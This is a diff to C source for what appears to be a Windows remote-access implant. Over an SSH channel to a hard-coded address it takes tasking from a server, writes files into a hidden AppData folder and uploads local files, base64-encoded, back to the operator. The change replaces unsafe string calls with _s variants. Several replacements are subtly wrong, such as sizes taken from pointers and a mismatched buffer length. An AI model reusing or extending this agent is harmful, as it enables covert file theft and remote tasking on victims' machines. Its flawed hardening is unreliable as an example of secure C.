@@ -36,20 +36,21 @@ int parse_tasking(char* tasking, ssh_channel chan) {
 	char* dat = NULL;
 	char tmpbf[3];
 
-	for (; tasking[num]; tasking[num] == '\n' ? num++ : *tasking++);
+	for (; tasking[num]; tasking[num] == '\n' ? num++ : tasking++);
 	tasking = tmp;
 	fprintf(logfile, "Number of tasks to do: %d\n", num);
 	//struct tasking_struct* tasking_arr[num];
 	if (num == 0) return 0;
 
-	char* p = strtok(tasking, "\n");
+	char* nextToken = NULL;
+	char* p = strtok_s(tasking, "\n", &nextToken);
 
 	// Parses the data into list
 	while (p != NULL)
 	{
 		// get operation int
 		memset(tmpbf, 0, sizeof(tmpbf));
-		strncat(tmpbf, p, 2);
+		strncat_s(tmpbf, _countof(tmpbf), p, 2);
 		struct tasking_struct* curr = malloc(sizeof(struct tasking_struct));
 		curr->operation = atoi(tmpbf);
 
@@ -68,7 +69,7 @@ int parse_tasking(char* tasking, ssh_channel chan) {
 
 
 		// clean up and move on
-		p = strtok(NULL, "\n");
+		p = strtok_s(NULL, "\n", &nextToken);
 		//memset(tmpbf, 0, 2);
 	}
 	if (firstStruct == NULL) return 0;
@@ -83,10 +84,10 @@ int parse_tasking(char* tasking, ssh_channel chan) {
 
 			char *send = malloc(sizeof(*send) * (4+strlen(firstStruct->opts)));
 			char temp2[3];
-			_itoa(firstStruct->operation, temp2, 10);
-			strcpy(send, temp2);
-			strcat(send, "|");
-			strcat(send, firstStruct->opts);
+			_itoa_s(firstStruct->operation, temp2, _countof(temp2), 10);
+			strcpy_s(send, _countof(send), temp2);
+			strcat_s(send, _countof(send), "|");
+			strcat_s(send, 4+strlen(firstStruct->opts), firstStruct->opts);
 			catchChannelError(ssh_channel_write(chan, send, strlen(send)+1), chan);
 			catchChannelError(ssh_channel_read(chan, size, sizeof(size), 0), chan);
 			catchChannelError(ssh_channel_write(chan, "ok", 3), chan);
@@ -106,10 +107,10 @@ int parse_tasking(char* tasking, ssh_channel chan) {
 			FILE* file;
 
 			char filename[256] = "";
-			strcpy(filename, folderpath);
-			strcat(filename, "\\");
-			strcat(filename, firstStruct->opts);
-			file = fopen(filename, "w");
+			strcpy_s(filename, _countof(filename), folderpath);
+			strcat_s(filename, _countof(filename), "\\");
+			strcat_s(filename, _countof(filename), firstStruct->opts);
+			fopen_s(&file, filename, "w");
 			if (file == NULL)
 			{
 				fprintf(logfile, "Unable to create file.\n");
@@ -129,26 +130,27 @@ int parse_tasking(char* tasking, ssh_channel chan) {
 
 			ufilename = malloc(sizeof(ufilename) * strlen(firstStruct->opts));
 			int lastslash = 0;
-			for (int i = 0; i < strlen(firstStruct->opts); ++i) {
+			for (unsigned int i = 0; i < strlen(firstStruct->opts); ++i) {
 				if (firstStruct->opts[i] == '\\') lastslash = i;
 			}
 			
-			strncpy(ufilename, firstStruct->opts + lastslash + 1, strlen(firstStruct->opts));
+			strncpy_s(ufilename, strlen(firstStruct->opts), firstStruct->opts + lastslash + 1, strlen(firstStruct->opts));
 
-			toupload = fopen(firstStruct->opts, "r");
+			fopen_s(&toupload, firstStruct->opts, "r");
+			if (toupload == NULL) catchChannelError(-1, chan);
 			fseek(toupload, 0L, SEEK_END);
 			int uploadsize = ftell(toupload);
 			int uploadsizee = b64_encoded_size(uploadsize);
 			sendcommand = malloc(sizeof(sendcommand) * (strlen(firstStruct->opts) + 3));
 			filedata = malloc(sizeof(filedata) * (uploadsize + 1));
-			strcpy(sendcommand, "11|");
-			strcat(sendcommand, ufilename);
+			strcpy_s(sendcommand, _countof(sendcommand), "11|");
+			strcat_s(sendcommand, strlen(firstStruct->opts) + 3, ufilename);
 			rewind(toupload);
 
 			catchChannelError(ssh_channel_write(chan, sendcommand, strlen(sendcommand)), chan);
 			catchChannelError(ssh_channel_read(chan, temp, 3, 0), chan);
 			char sizebuf[64] = "ok";
-			sprintf(temp, "%d", uploadsizee);
+			sprintf_s(temp, _countof(temp), "%d", uploadsizee);
 			catchChannelError(ssh_channel_write(chan, temp, sizeof(temp)), chan);
 			catchChannelError(ssh_channel_read(chan, temp, 3, 0), chan);
 
@@ -178,7 +180,6 @@ int func_loop(ssh_session session)	//probably replace
 	// Initialize vars
 	ssh_channel channel;
 	char tasking[2048];
-	int nbytes;
 
 	memset(tasking, 0, sizeof(tasking));
 	channel = ssh_channel_new(session);
@@ -253,22 +254,21 @@ int main()
 	TCHAR username[UNLEN + 1];
 	DWORD size = UNLEN + 1;
 	GetUserName((TCHAR*)username, &size);
-	strncpy(actualusername, &(char)(username[0]), 1);
-	for (int i = 1; i <= sizeof(username); i++) {
-		if (isalpha(username[i]) | isdigit(username[i])) strncat(actualusername, &(char)(username[i]), 1);
+	strncpy_s(actualusername, sizeof(actualusername), &(char)(username[0]), 1);
+	for (unsigned int i = 1; i <= sizeof(username); i++) {
+		if (isalpha(username[i]) | isdigit(username[i])) strncat_s(actualusername, _countof(actualusername), &(char)(username[i]), 1);
 		else break;
 	}
-	strcat(folderpath, actualusername);
-	strcat(folderpath, "\\AppData\\Roaming\\NICKTEST");
-	mkdir(folderpath);
+	strcat_s(folderpath, _countof(folderpath), actualusername);
+	strcat_s(folderpath, _countof(folderpath), "\\AppData\\Roaming\\NICKTEST");
+	_mkdir((const char*) folderpath);
 
 	char logpath[256] = "";
-	strcpy(logpath, folderpath);
-	strcat(logpath, "\\log.txt");
-	logfile = fopen(logpath, "a");
+	strcpy_s(logpath, _countof(logpath), folderpath);
+	strcat_s(logpath, _countof(folderpath), "\\log.txt");
+	fopen_s(&logfile, logpath, "a");
 	
 	fprintf(logfile, "==============================\n\n");
-
 	
 	session = connectserver("192.168.0.88", "WINDOWS_CLIENT");	//Make this less hard-coded
 
